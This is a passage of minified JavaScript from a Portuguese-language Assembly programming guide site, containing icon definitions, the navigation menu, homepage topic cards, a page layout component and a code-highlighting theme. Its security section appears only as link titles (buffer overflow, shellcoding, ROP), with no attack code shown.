20v2",key:"1rnc9c"}],["path",{d:"M17 2v2",key:"11trls"}],["path",{d:"M2 12h2",key:"1t8f8n"}],["path",{d:"M2 17h2",key:"7oei6x"}],["path",{d:"M2 7h2",key:"asdhe0"}],["path",{d:"M20 12h2",key:"1q8mjw"}],["path",{d:"M20 17h2",key:"1fpfkl"}],["path",{d:"M20 7h2",key:"1o8tra"}],["path",{d:"M7 20v2",key:"4gnj0m"}],["path",{d:"M7 2v2",key:"1i4yhu"}],["rect",{x:"4",y:"4",width:"16",height:"16",rx:"2",key:"1vbyd7"}],["rect",{x:"8",y:"8",width:"8",height:"8",rx:"1",key:"z9xiuo"}]],ar=fe("cpu",Hb);const Zb=[["ellipse",{cx:"12",cy:"5",rx:"9",ry:"3",key:"msslwz"}],["path",{d:"M3 5V19A9 3 0 0 0 21 19V5",key:"1wlel7"}],["path",{d:"M3 12A9 3 0 0 0 21 12",key:"mv7ke4"}]],ep=fe("database",Zb);const Qb=[["path",{d:"M14 2v6a2 2 0 0 0 .245.96l5.51 10.08A2 2 0 0 1 18 22H6a2 2 0 0 1-1.755-2.96l5.51-10.08A2 2 0 0 0 10 8V2",key:"18mbvz"}],["path",{d:"M6.453 15h11.094",key:"3shlmq"}],["path",{d:"M8.5 2h7",key:"csnxdl"}]],hi=fe("flask-conical",Qb);const Yb=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"M12 16v-4",key:"1dtifu"}],["path",{d:"M12 8h.01",key:"e9boi3"}]],Kb=fe("info",Yb);const Wb=[["path",{d:"M12.83 2.18a2 2 0 0 0-1.66 0L2.6 6.08a1 1 0 0 0 0 1.83l8.58 3.91a2 2 0 0 0 1.66 0l8.58-3.9a1 1 0 0 0 0-1.83z",key:"zw3jo"}],["path",{d:"M2 12a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 12",key:"1wduqc"}],["path",{d:"M2 17a1 1 0 0 0 .58.91l8.6 3.91a2 2 0 0 0 1.65 0l8.58-3.9A1 1 0 0 0 22 17",key:"kqbvx6"}]],ap=fe("layers",Wb);const Jb=[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]],rp=fe("lock",Jb);const $b=[["path",{d:"M4 5h16",key:"1tepv9"}],["path",{d:"M4 12h16",key:"1lakjw"}],["path",{d:"M4 19h16",key:"1djgab"}]],eg=fe("menu",$b);const ag=[["path",{d:"M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401",key:"kfwtm"}]],rg=fe("moon",ag);const tg=[["rect",{x:"16",y:"16",width:"6",height:"6",rx:"1",key:"4q2zg0"}],["rect",{x:"2",y:"16",width:"6",height:"6",rx:"1",key:"8cvhb9"}],["rect",{x:"9",y:"2",width:"6",height:"6",rx:"1",key:"1egb70"}],["path",{d:"M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3",key:"1jsf9p"}],["path",{d:"M12 12V8",key:"2874zd"}]],tp=fe("network",tg);const sg=[["path",{d:"M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",key:"1i5ecw"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]],fi=fe("settings",sg);const og=[["path",{d:"M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z",key:"oel41y"}]],$l=fe("shield",og);const ig=[["circle",{cx:"12",cy:"12",r:"4",key:"4exip2"}],["path",{d:"M12 2v2",key:"tus03m"}],["path",{d:"M12 20v2",key:"1lh1kg"}],["path",{d:"m4.93 4.93 1.41 1.41",key:"149t6j"}],["path",{d:"m17.66 17.66 1.41 1.41",key:"ptbguv"}],["path",{d:"M2 12h2",key:"1t8f8n"}],["path",{d:"M20 12h2",key:"1q8mjw"}],["path",{d:"m6.34 17.66-1.41 1.41",key:"1m8zz5"}],["path",{d:"m19.07 4.93-1.41 1.41",key:"1shlcs"}]],ng=fe("sun",ig);const lg=[["path",{d:"M12 19h8",key:"baeox8"}],["path",{d:"m4 17 6-6-6-6",key:"1yngyt"}]],Gs=fe("terminal",lg);const cg=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],dg=fe("triangle-alert",cg);const mg=[["path",{d:"M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.106-3.105c.32-.322.863-.22.983.218a6 6 0 0 1-8.259 7.057l-7.91 7.91a1 1 0 0 1-2.999-3l7.91-7.91a6 6 0 0 1 7.057-8.259c.438.12.54.662.219.984z",key:"1ngwbx"}]],sp=fe("wrench",mg);const ug=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],xg=fe("x",ug);const pg=[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]],Vs=fe("zap",pg),hg=[{label:"Introdução",icon:xi,children:[{label:"O que é Assembly",path:"/introducao"},{label:"História do Assembly",path:"/historia"},{label:"Por que Aprender?",path:"/por-que-aprender"},{label:"Arquiteturas (x86, ARM...)",path:"/arquiteturas"}]},{label:"Fundamentos",icon:Jl,children:[{label:"Sistemas Numéricos",path:"/sistemas-numericos"},{label:"Representação de Dados",path:"/representacao-dados"},{label:"Registradores x86-64",path:"/registradores"},{label:"Memória e Endereçamento",path:"/memoria"},{label:"Registrador FLAGS",path:"/flags"}]},{label:"Ambiente de Dev",icon:sp,children:[{label:"Instalando NASM",path:"/instalacao-nasm"},{label:"GNU Assembler (GAS)",path:"/instalacao-gas"},{label:"Hello World",path:"/hello-world"},{label:"GDB - Debugging",path:"/gdb"},{label:"objdump & readelf",path:"/objdump"},{label:"strace & ltrace",path:"/strace"}]},{label:"Instruções Básicas",icon:pi,children:[{label:"Movimento de Dados",path:"/instrucoes-movimento"},{label:"Aritmética",path:"/aritmetica"},{label:"Operações Lógicas",path:"/logica"},{label:"Comparações e Saltos",path:"/saltos"},{label:"Shifts e Rotações",path:"/shifts"}]},{label:"Controle de Fluxo",icon:ap,children:[{label:"Labels e Condicionais",path:"/controle-fluxo"},{label:"Loops",path:"/loops"},{label:"Recursão",path:"/recursao"}]},{label:"Funções e Stack",icon:Gs,children:[{label:"Funções e Stack",path:"/funcoes-stack"},{label:"Calling Conventions",path:"/calling-conventions"},{label:"Stack Frame",path:"/stack-frame"},{label:"Funções Variádicas",path:"/varargs"}]},{label:"Memória e Dados",icon:ep,children:[{label:"Segmentos de Memória",path:"/segmentos"},{label:"Ponteiros",path:"/ponteiros"},{label:"Strings e Arrays",path:"/strings-arrays"},{label:"Estruturas (Structs)",path:"/estruturas"}]},{label:"System Calls",icon:fi,children:[{label:"Syscalls Linux x86-64",path:"/syscalls-linux"},{label:"Syscalls Windows",path:"/syscalls-windows"},{label:"I/O e Processos",path:"/io-processos"}]},{label:"Modos do Processador",icon:ar,children:[{label:"Modo Real (16-bit)",path:"/modo-real"},{label:"Modo Protegido (32-bit)",path:"/modo-protegido"},{label:"Long Mode (64-bit)",path:"/long-mode"}]},{label:"SIMD & Vetorização",icon:Vs,children:[{label:"Introdução SIMD/SSE",path:"/simd"},{label:"Instruções SSE/SSE2",path:"/sse"},{label:"AVX e AVX-512",path:"/avx"},{label:"x87 FPU",path:"/fpu"}]},{label:"Interoperabilidade",icon:tp,children:[{label:"Assembly Inline (C/C++)",path:"/inline-assembly"},{label:"Linking com C",path:"/linking-c"},{label:"Exportar Funções",path:"/exportar-funcoes"},{label:"ABI (Application Binary)",path:"/abi"}]},{label:"Otimização",icon:Vs,children:[{label:"Pipeline da CPU",path:"/pipeline"},{label:"Cache e Localidade",path:"/cache"},{label:"Branch Prediction",path:"/branch-prediction"},{label:"Técnicas de Otimização",path:"/otimizacao"}]},{label:"Depuração e Análise",icon:hi,children:[{label:"GDB Avançado",path:"/gdb-avancado"},{label:"Análise de Binários",path:"/analise-binarios"},{label:"Engenharia Reversa",path:"/eng-reversa"}]},{label:"ARM Assembly",icon:ar,children:[{label:"Introdução ao ARM",path:"/arm-introducao"},{label:"Registradores ARM",path:"/arm-registradores"},{label:"Instruções ARM",path:"/arm-instrucoes"},{label:"Thumb e Thumb-2",path:"/arm-thumb"},{label:"Raspberry Pi",path:"/raspberry-pi"}]},{label:"RISC-V",icon:ar,children:[{label:"Introdução RISC-V",path:"/riscv-introducao"},{label:"Registradores RISC-V",path:"/riscv-registradores"},{label:"Instruções RISC-V",path:"/riscv-instrucoes"}]},{label:"Windows Assembly",icon:fi,children:[{label:"MASM (Microsoft)",path:"/masm"},{label:"Win32 API em Assembly",path:"/win32-api"},{label:"Windows x64 ABI",path:"/win64-abi"}]},{label:"Segurança",icon:$l,children:[{label:"Buffer Overflow",path:"/buffer-overflow"},{label:"Shellcoding",path:"/shellcoding"},{label:"ROP (Return-Oriented)",path:"/rop"}]},{label:"Macros e Diretivas",icon:pi,children:[{label:"Macros NASM",path:"/macros"},{label:"Diretivas e Pseudo-ops",path:"/diretivas"},{label:"Pré-processamento",path:"/preprocessamento"}]},{label:"Projetos Práticos",icon:hi,children:[{label:"Implementar printf",path:"/projeto-printf"},{label:"Alocador de Memória",path:"/projeto-malloc"},{label:"Algoritmos de Sort",path:"/projeto-sort"},{label:"Bootloader (Hello World)",path:"/bootloader"},{label:"Kernel Mínimo",path:"/kernel-minimo"}]},{label:"Assembly & Criptografia",icon:rp,children:[{label:"AES com AES-NI",path:"/aes-assembly"},{label:"SHA-256 em Assembly",path:"/sha256-assembly"}]},{label:"Referências",icon:xi,path:"/referencias"}];function op({item:i,depth:l=0}){const[u]=gi(),[m,f]=se.useState(()=>i.children?i.children.some(A=>A.path===u):!1);if(i.path&&!i.children){const A=u===i.path;return r.jsx(La,{href:i.path,children:r.jsxs("div",{className:et("flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm cursor-pointer transition-all",l===0?"font-medium":"pl-7",A?"bg-primary/15 text-primary font-semibold":"text-muted-foreground hover:text-foreground hover:bg-muted"),children:[i.icon&&r.jsx(i.icon,{className:"w-4 h-4 shrink-0"}),r.jsx("span",{className:"truncate",children:i.label})]})})}const j=i.children?.some(A=>A.path===u);return r.jsxs("div",{children:[r.jsxs("button",{onClick:()=>f(A=>!A),className:et("w-full flex items-center gap-2 px-3 py-1.5 rounded-lg text-sm font-semibold transition-all",j?"text-primary":"text-foreground hover:bg-muted"),children:[i.icon&&r.jsx(i.icon,{className:"w-4 h-4 shrink-0 text-primary/70"}),r.jsx("span",{className:"flex-1 text-left truncate",children:i.label}),m?r.jsx(zb,{className:"w-3.5 h-3.5 text-muted-foreground"}):r.jsx(Gl,{className:"w-3.5 h-3.5 text-muted-foreground"})]}),m&&r.jsx("div",{className:"mt-0.5 ml-2 border-l border-border/50 pl-2 space-y-0.5",children:i.children?.map((A,R)=>r.jsx(op,{item:A,depth:l+1},R))})]})}function fg({isOpen:i,setIsOpen:l}){return r.jsxs(r.Fragment,{children:[i&&r.jsx("div",{className:"fixed inset-0 bg-black/50 z-40 lg:hidden",onClick:()=>l(!1)}),r.jsxs("aside",{className:et("fixed top-0 left-0 h-full w-72 z-50 bg-background border-r border-border flex flex-col transition-transform duration-300","lg:translate-x-0",i?"translate-x-0":"-translate-x-full"),children:[r.jsxs("div",{className:"flex items-center justify-between px-4 h-14 border-b border-border shrink-0",children:[r.jsxs(La,{href:"/",className:"flex items-center gap-2 font-black text-sm text-foreground",children:[r.jsx("div",{className:"w-7 h-7 rounded-lg bg-primary/20 flex items-center justify-center",children:r.jsx(ar,{className:"w-4 h-4 text-primary"})}),r.jsx("span",{children:"Assembly Guide"})]}),r.jsx("button",{onClick:()=>l(!1),className:"lg:hidden p-1.5 rounded-lg hover:bg-muted",children:r.jsx(xg,{className:"w-4 h-4"})})]}),r.jsxs("div",{className:"flex-1 overflow-y-auto py-4 px-3 space-y-1 scrollbar-thin",children:[r.jsx(La,{href:"/",children:r.jsxs("div",{className:et("flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-bold transition-all mb-2","text-muted-foreground hover:text-foreground hover:bg-muted"),children:[r.jsx(xi,{className:"w-4 h-4 text-primary"}),"Início"]})}),hg.map((u,m)=>r.jsx(op,{item:u},m))]}),r.jsx("div",{className:"p-4 border-t border-border",children:r.jsx("div",{className:"text-xs text-muted-foreground text-center",children:"Assembly — Livro Completo 2025"})})]})]})}function bg(){const[i,l]=se.useState(()=>typeof window<"u"?localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"):"dark");return se.useEffect(()=>{const m=document.documentElement;m.classList.remove("light","dark"),m.classList.add(i),localStorage.setItem("theme",i)},[i]),{theme:i,toggleTheme:()=>l(m=>m==="light"?"dark":"light")}}function gg({onMenuClick:i}){const{theme:l,toggleTheme:u}=bg();return r.jsxs("header",{className:"sticky top-0 z-30 h-14 flex items-center border-b border-border bg-background/80 backdrop-blur-md px-4 gap-3",children:[r.jsx("button",{onClick:i,className:"lg:hidden p-2 rounded-lg hover:bg-muted transition-colors","aria-label":"Menu",children:r.jsx(eg,{className:"w-5 h-5"})}),r.jsxs(La,{href:"/",className:"flex items-center gap-2 font-black text-sm text-foreground lg:hidden",children:[r.jsx(ar,{className:"w-4 h-4 text-primary"}),r.jsx("span",{children:"Assembly Guide"})]}),r.jsx("div",{className:"flex-1"}),r.jsx("button",{onClick:u,className:"p-2 rounded-lg hover:bg-muted transition-colors text-muted-foreground hover:text-foreground","aria-label":"Alternar tema",children:l==="dark"?r.jsx(ng,{className:"w-4 h-4"}):r.jsx(rg,{className:"w-4 h-4"})})]})}const vg=[{title:"Introdução",desc:"O que é Assembly, história e por que aprender",icon:xi,path:"/introducao",color:"text-blue-400",bg:"bg-blue-500/10",count:"4 tópicos"},{title:"Fundamentos",desc:"Registradores, memória, sistemas numéricos",icon:Jl,path:"/sistemas-numericos",color:"text-primary",bg:"bg-primary/10",count:"5 tópicos"},{title:"Ambiente de Dev",desc:"NASM, GAS, GDB, objdump, strace",icon:sp,path:"/instalacao-nasm",color:"text-green-400",bg:"bg-green-500/10",count:"6 tópicos"},{title:"Instruções Básicas",desc:"MOV, aritmética, lógica, saltos, shifts",icon:pi,path:"/instrucoes-movimento",color:"text-yellow-400",bg:"bg-yellow-500/10",count:"5 tópicos"},{title:"Controle de Fluxo",desc:"Condicionais, loops e recursão",icon:ap,path:"/controle-fluxo",color:"text-purple-400",bg:"bg-purple-500/10",count:"3 tópicos"},{title:"Funções e Stack",desc:"Calling conventions, stack frame, ABI",icon:Gs,path:"/funcoes-stack",color:"text-cyan-400",bg:"bg-cyan-500/10",count:"4 tópicos"},{title:"Memória e Dados",desc:"Segmentos, ponteiros, strings, structs",icon:ep,path:"/segmentos",color:"text-orange-400",bg:"bg-orange-500/10",count:"4 tópicos"},{title:"System Calls",desc:"Linux e Windows syscalls, I/O, processos",icon:fi,path:"/syscalls-linux",color:"text-pink-400",bg:"bg-pink-500/10",count:"3 tópicos"},{title:"Modos do Processador",desc:"Modo real, protegido e long mode 64-bit",icon:ar,path:"/modo-real",color:"text-indigo-400",bg:"bg-indigo-500/10",count:"3 tópicos"},{title:"SIMD & Vetorização",desc:"SSE, AVX, AVX-512 e FPU x87",icon:Vs,path:"/simd",color:"text-emerald-400",bg:"bg-emerald-500/10",count:"4 tópicos"},{title:"Interoperabilidade",desc:"Inline ASM, linking C, ABI",icon:tp,path:"/inline-assembly",color:"text-teal-400",bg:"bg-teal-500/10",count:"4 tópicos"},{title:"Otimização",desc:"Pipeline, cache, branch prediction",icon:Vs,path:"/pipeline",color:"text-amber-400",bg:"bg-amber-500/10",count:"4 tópicos"},{title:"ARM Assembly",desc:"ARMv7, AArch64, Thumb e Raspberry Pi",icon:ar,path:"/arm-introducao",color:"text-rose-400",bg:"bg-rose-500/10",count:"5 tópicos"},{title:"RISC-V",desc:"Arquitetura RISC-V, registradores e instruções",icon:ar,path:"/riscv-introducao",color:"text-violet-400",bg:"bg-violet-500/10",count:"3 tópicos"},{title:"Windows Assembly",desc:"MASM, Win32 API e Windows x64 ABI",icon:fi,path:"/masm",color:"text-sky-400",bg:"bg-sky-500/10",count:"3 tópicos"},{title:"Segurança",desc:"Buffer overflow, shellcoding, ROP",icon:$l,path:"/buffer-overflow",color:"text-red-400",bg:"bg-red-500/10",count:"3 tópicos"},{title:"Macros & Diretivas",desc:"Macros NASM, diretivas, pré-processamento",icon:pi,path:"/macros",color:"text-lime-400",bg:"bg-lime-500/10",count:"3 tópicos"},{title:"Projetos Práticos",desc:"printf, malloc, sort, bootloader, kernel",icon:hi,path:"/projeto-printf",color:"text-fuchsia-400",bg:"bg-fuchsia-500/10",count:"5 tópicos"},{title:"Criptografia",desc:"AES com AES-NI e SHA-256 em Assembly",icon:rp,path:"/aes-assembly",color:"text-cyan-400",bg:"bg-cyan-500/10",count:"2 tópicos"}],jg=[{icon:Jl,title:"Hello World em NASM",desc:"Seu primeiro programa do zero",path:"/hello-world"},{icon:Gs,title:"Calling Conventions x86-64",desc:"System V AMD64 ABI completo",path:"/calling-conventions"},{icon:Vs,title:"SSE/AVX SIMD",desc:"Vetorização e performance extrema",path:"/simd"},{icon:$l,title:"Shellcoding",desc:"Criando shellcodes reais",path:"/shellcoding"},{icon:ar,title:"ARM AArch64",desc:"Assembly moderno para mobile/embarcados",path:"/arm-introducao"},{icon:hi,title:"Bootloader do Zero",desc:"Escrever um bootloader em Assembly",path:"/bootloader"}];function yg(){return r.jsxs("div",{className:"min-h-screen",children:[r.jsxs("section",{className:"relative overflow-hidden pt-16 pb-24 px-4",children:[r.jsxs("div",{className:"absolute inset-0 z-0 pointer-events-none",children:[r.jsx("div",{className:"absolute inset-0 bg-gradient-to-br from-primary/5 via-transparent to-secondary/5"}),r.jsx("div",{className:"absolute top-20 left-1/4 w-72 h-72 bg-primary/5 rounded-full blur-3xl"}),r.jsx("div",{className:"absolute bottom-20 right-1/4 w-72 h-72 bg-secondary/5 rounded-full blur-3xl"})]}),r.jsx("div",{className:"max-w-4xl mx-auto relative z-10 text-center",children:r.jsxs(di.div,{initial:{opacity:0,y:20},animate:{opacity:1,y:0},transition:{duration:.5},children:[r.jsxs("div",{className:"inline-flex items-center gap-2 px-3 py-1 rounded-full bg-primary/10 text-primary border border-primary/20 text-xs font-medium mb-6",children:[r.jsx("span",{className:"w-2 h-2 rounded-full bg-primary animate-pulse"}),"Livro Completo 2025 — 80+ Tópicos"]}),r.jsxs("h1",{className:"text-5xl md:text-7xl font-black tracking-tight mb-6 mt-0 pb-0 border-0",children:[r.jsx("span",{className:"text-foreground",children:"Domine o "}),r.jsx("span",{className:"text-transparent bg-clip-text bg-gradient-to-r from-primary to-secondary",children:"Assembly"})]}),r.jsx("p",{className:"text-lg md:text-xl text-muted-foreground mb-10 max-w-2xl mx-auto leading-relaxed",children:"Do zero ao nível expert. O guia mais completo de Assembly em português — x86-64, ARM, RISC-V, SIMD, segurança, projetos reais e muito mais."}),r.jsxs("div",{className:"flex flex-col sm:flex-row items-center justify-center gap-3",children:[r.jsx(La,{href:"/introducao",className:"w-full sm:w-auto px-7 py-3.5 rounded-xl bg-primary text-primary-foreground font-semibold shadow-lg shadow-primary/25 hover:-translate-y-0.5 hover:shadow-xl hover:shadow-primary/30 transition-all text-sm",children:"Começar do Zero"}),r.jsxs(La,{href:"/hello-world",className:"w-full sm:w-auto px-7 py-3.5 rounded-xl bg-card border border-border text-foreground font-semibold hover:bg-muted hover:-translate-y-0.5 transition-all flex items-center justify-center gap-2 text-sm",children:[r.jsx(Gs,{className:"w-4 h-4"}),"Primeiro Programa"]})]})]})})]}),r.jsx("section",{className:"border-y border-border bg-card/50",children:r.jsx("div",{className:"max-w-5xl mx-auto px-4 py-10",children:r.jsx("div",{className:"grid grid-cols-2 md:grid-cols-4 gap-6 text-center",children:[{value:"80+",label:"Tópicos Cobertos"},{value:"500+",label:"Exemplos de Código"},{value:"100%",label:"Em Português"},{value:"2025",label:"Totalmente Atualizado"}].map((i,l)=>r.jsxs("div",{className:"py-2",children:[r.jsx("div",{className:`text-3xl font-black mb-1 ${l===2?"text-secondary":l===0?"text-primary":"text-foreground"}`,children:i.value}),r.jsx("div",{className:"text-xs text-muted-foreground uppercase tracking-wider font-medium",children:i.label})]},l))})})}),r.jsxs("section",{className:"py-20 px-4 max-w-6xl mx-auto",children:[r.jsxs("div",{className:"mb-10 text-center",children:[r.jsx("h2",{className:"text-3xl font-bold mb-3 border-0 mt-0",children:"Explore por Categorias"}),r.jsx("p",{className:"text-muted-foreground",children:"19 seções estruturadas, do básico ao expert absoluto."})]}),r.jsx("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4",children:vg.map((i,l)=>r.jsx(La,{href:i.path,children:r.jsxs(di.div,{whileHover:{y:-4},className:"group p-5 rounded-2xl bg-card border border-border shadow-sm hover:shadow-lg transition-all cursor-pointer h-full flex flex-col",children:[r.jsx("div",{className:`w-10 h-10 rounded-xl ${i.bg} ${i.color} flex items-center justify-center mb-4 group-hover:scale-110 transition-transform`,children:r.jsx(i.icon,{className:"w-5 h-5"})}),r.jsxs("div",{className:"flex items-start justify-between mb-1",children:[r.jsx("h3",{className:"text-base font-bold text-foreground mt-0 mb-0 border-0",children:i.title}),r.jsx("span",{className:"text-xs text-muted-foreground ml-2 shrink-0 mt-0.5",children:i.count})]}),r.jsx("p",{className:"text-sm text-muted-foreground mb-4 flex-1",children:i.desc}),r.jsxs("div",{className:"flex items-center text-primary font-medium text-xs mt-auto",children:["Acessar ",r.jsx(Gl,{className:"w-3.5 h-3.5 ml-1 group-hover:translate-x-1 transition-transform"})]})]})},l))})]}),r.jsx("section",{className:"py-16 px-4 bg-card/30 border-y border-border",children:r.jsxs("div",{className:"max-w-5xl mx-auto",children:[r.jsxs("div",{className:"mb-8 text-center",children:[r.jsx("span",{className:"text-xs font-semibold text-primary uppercase tracking-widest",children:"Destaques"}),r.jsx("h2",{className:"text-2xl font-bold mt-2 border-0",children:"Tópicos em Evidência"})]}),r.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3",children:jg.map((i,l)=>r.jsx(La,{href:i.path,children:r.jsxs("div",{className:"flex items-center gap-3 p-4 rounded-xl bg-card border border-border hover:border-primary/30 hover:bg-primary/5 transition-all group cursor-pointer",children:[r.jsx("div",{className:"w-8 h-8 rounded-lg bg-primary/10 flex items-center justify-center shrink-0 group-hover:bg-primary/20 transition-colors",children:r.jsx(i.icon,{className:"w-4 h-4 text-primary"})}),r.jsxs("div",{children:[r.jsx("div",{className:"text-sm font-semibold text-foreground",children:i.title}),r.jsx("div",{className:"text-xs text-muted-foreground",children:i.desc})]}),r.jsx(Gl,{className:"w-4 h-4 text-muted-foreground ml-auto group-hover:text-primary transition-all"})]})},l))})]})}),r.jsx("section",{className:"py-20 px-4 text-center",children:r.jsxs("div",{className:"max-w-2xl mx-auto",children:[r.jsx("h2",{className:"text-2xl font-bold mb-3 border-0",children:"Pronto para dominar o Assembly?"}),r.jsx("p",{className:"text-muted-foreground mb-6",children:"Comece pelo básico e evolua até escrever seu próprio bootloader e shellcodes."}),r.jsxs(La,{href:"/introducao",className:"inline-flex items-center gap-2 px-7 py-3.5 rounded-xl bg-primary text-primary-foreground font-semibold shadow-lg shadow-primary/25 hover:-translate-y-0.5 transition-all text-sm",children:[r.jsx(Gs,{className:"w-4 h-4"}),"Começar Agora"]})]})})]})}function Sg({level:i}){const l={iniciante:"bg-secondary/20 text-secondary border-secondary/30",intermediario:"bg-yellow-500/20 text-yellow-400 border-yellow-500/30",avancado:"bg-primary/20 text-primary border-primary/30",expert:"bg-red-500/20 text-red-400 border-red-500/30"},u={iniciante:"Iniciante",intermediario:"Intermediário",avancado:"Avançado",expert:"Expert"};return r.jsx("span",{className:et("text-xs font-semibold px-2.5 py-1 rounded-full border",l[i]),children:u[i]})}function L({title:i,subtitle:l,difficulty:u,timeToRead:m,children:f}){return r.jsxs(di.div,{initial:{opacity:0,y:16},animate:{opacity:1,y:0},transition:{duration:.35},className:"max-w-4xl mx-auto px-4 sm:px-6 py-10",children:[r.jsxs("div",{className:"mb-8 pb-6 border-b border-border",children:[r.jsx("h1",{className:"text-3xl md:text-4xl font-black tracking-tight text-foreground mb-3 mt-0",children:i}),l&&r.jsx("p",{className:"text-muted-foreground text-lg leading-relaxed",children:l}),(u||m)&&r.jsxs("div",{className:"flex items-center gap-3 mt-4",children:[u&&r.jsx(Sg,{level:u}),m&&r.jsxs("span",{className:"flex items-center gap-1.5 text-xs text-muted-foreground",children:[r.jsx(kb,{className:"w-3.5 h-3.5"}),m," de leitura"]})]})]}),r.jsx("div",{className:`prose prose-invert prose-lg max-w-none
        prose-headings:font-bold prose-headings:tracking-tight prose-headings:text-foreground
        prose-h2:text-2xl prose-h2:mt-10 prose-h2:mb-4 prose-h2:border-b prose-h2:border-border prose-h2:pb-2
        prose-h3:text-lg prose-h3:mt-6 prose-h3:mb-3 prose-h3:text-primary
        prose-p:text-muted-foreground prose-p:leading-relaxed prose-p:mb-4
        prose-li:text-muted-foreground prose-li:leading-relaxed prose-li:mb-1
        prose-code:text-primary prose-code:bg-primary/10 prose-code:px-1.5 prose-code:py-0.5 prose-code:rounded prose-code:text-sm prose-code:font-mono
        prose-strong:text-foreground prose-strong:font-semibold
        prose-a:text-secondary prose-a:no-underline hover:prose-a:underline
        prose-pre:bg-transparent prose-pre:p-0 prose-pre:m-0
        prose-table:border-collapse prose-th:border prose-th:border-border prose-th:p-3 prose-th:bg-card prose-td:border prose-td:border-border prose-td:p-3
      `,children:f})]})}const Ag={'pre[class*="language-"]':{color:"#d4d4d4",fontSize:"13px",textShadow:"none",fontFamily:'Menlo, Monaco, Consolas, "Andale Mono", "Ubuntu Mono", "Courier New", monospace',direction:"ltr",textAlign:"left",whiteSpace:"pre",wordSpacing:"normal",wordBreak:"normal",lineHeight:"1.5",MozTabSize:"4",OTabSize:"4",tabSize:"4",WebkitHyphens:"none",MozHyphens:"none",msHyphens:"none",hyphens:"none",padding:"1em",margin:".5em 0",overflow:"auto",background:"#1e1e1e"},'code[class*="language-"]':{color:"#d4d4d4",fontSize:"13px",textShadow:"none",fontFamily:'Menlo, Monaco, Consolas, "Andale Mono", "Ubuntu Mono", "Courier New", monospace',direction:"ltr",textAlign:"left",whiteSpace:"pre",wordSpacing:"normal",wordBreak:"normal",lineHeight:"1.5",MozTabSize:"4",OTabSize:"4",tabSize:"4",WebkitHyphens:"none",MozHyphens:"none",msHyphens:"none",hyphens:"none"},'pre[class*="language-"]::selection':{textShadow:"none",background:"#264F78"},'code[class*="language-"]::selection':{textShadow:"none",background:"#264F78"},'pre[class*="language-"] *::selection':{textShadow:"none",background:"#264F78"},'code[class*="language-"] *::selection':{textShadow:"none",background:"#264F78"},':not(pre) > code[class*="language-"]':{padding:".1em .3em",borderRadius:".3em",color:"#db4c69",background:"#1e1e1e"},".namespace":{Opacity:".7"},"doctype.doctype-tag":{color:"#569CD6"},"doctype.name":{color:"#9cdcfe"},comment:{color:"#6a9955"},prolog:{color:"#6a9955"},punctuation:{color:"#d4d4d4"},".language-html .language-css .token.punctuation":{color:"#d4d4d4"},".language-html .language-javascript .token.punctuation":{color:"#d4d4d4"},property:{color:"#9cdcfe"},tag:{color:"#569cd6"},boolean:{color:"#569cd6"},number:{color:"#b5cea8"},constant:{color:"#9cdcfe"},symbol:{color:"#b5cea8"},inserted:{color:"#b5cea8"},unit:{color:"#b5cea8"},selector:{color:"#d7ba7d"},"attr-name":{color:"#9cdcfe"},string:{color:"#ce9178"},char:{color:"#ce9178"},builtin:{color:"#ce9178"},deleted:{color:"#ce9178"},".language-css 